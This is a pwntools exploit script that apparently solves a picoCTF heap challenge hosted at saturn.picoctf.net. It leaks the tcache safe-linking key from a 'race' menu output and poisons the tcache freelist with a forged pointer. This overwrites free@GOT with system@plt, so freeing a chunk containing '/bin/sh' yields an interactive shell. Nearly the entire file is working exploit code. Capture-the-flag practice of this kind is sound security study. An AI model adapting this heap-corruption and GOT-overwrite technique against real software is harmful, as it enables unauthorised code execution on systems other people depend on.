#!/usr/bin/env python3
from pwn import *

PORT = 56901
HOST = "saturn.picoctf.net"
elf = context.binary = ELF('./vuln_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b*0x0000000000401CB9
            b*0x000000000040149A
            b*0x000000000040160F
            b*0x0000000000401AD9
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def add(idx, len, name):
    p.sendlineafter(b'Choice: ', b'1')
    p.sendlineafter(b"(0-17)? ", str(idx).encode())
    p.sendlineafter(b"length (16-256)? ", str(len).encode())
    p.sendlineafter(b"16 characters: ", name)

def remove(idx):
    p.sendlineafter(b'Choice: ', b'2')
    p.sendlineafter(b"(0-17)? ", str(idx).encode())

def cheat(idx, data, pos=0):
    p.sendlineafter(b'Choice: ', b'0')
    p.sendlineafter(b"(0-17)? ", str(idx).encode())
    p.sendline(data)
    p.sendlineafter(b'spot? ', str(pos).encode())

def race_leak_heap_key():
    p.sendlineafter(b"Choice: ", b"3")

    data = p.recvuntil(b"WINNER: ", drop=True)

    known_horses = [
        b"/bin/sh",
        b"C" * 16,
        b"D" * 16,
        b"E" * 16,
        b"X" * 16,
    ]

    leak = None

    for line in data.split(b"\n"):
        if b"|" not in line:
            continue

        candidate = line.rsplit(b"|", 1)[0].strip(b" ")

        if not candidate:
            continue

        if any(k in candidate for k in known_horses):
            continue

        leak = candidate
        break

    if leak is None:
        raise RuntimeError("heap leak failed")

    heap_key = u64(leak.ljust(8, b"\x00"))

    log.success(f"heap leak raw = {leak.hex()}")
    log.success(f"heap key      = {hex(heap_key)}")
    log.success(f"heap page     = {hex(heap_key << 12)}")

    p.recvline()

    return heap_key

## Exploit

free_got = elf.got.free
system_plt = elf.plt.system

target = free_got - 8

log.info(f"free@got   = {hex(free_got)}")
log.info(f"target     = {hex(target)}")
log.info(f"system@plt = {hex(system_plt)}")

add(0, 24, b'A'*24)

remove(0)
add(1, 24, b'\xff')
add(2, 24, b'/bin/sh\x00'.ljust(24, b'X'))
add(3, 24, b'C' * 24)
add(4, 24, b'D' * 24)
add(5, 24, b'E' * 24)

heap_key = race_leak_heap_key()

remove(1)
remove(3)

encoded_fd = target ^ heap_key

cheat(3, p64(encoded_fd).ljust(24, b"\x00"))

add(6, 24, b"B" * 24)

payload = flat(
    p64(0),
    p64(system_plt),
) + b"\xff"

add(7, 24, payload)

# Trigger free("/bin/sh") -> system("/bin/sh")
remove(2)

p.interactive()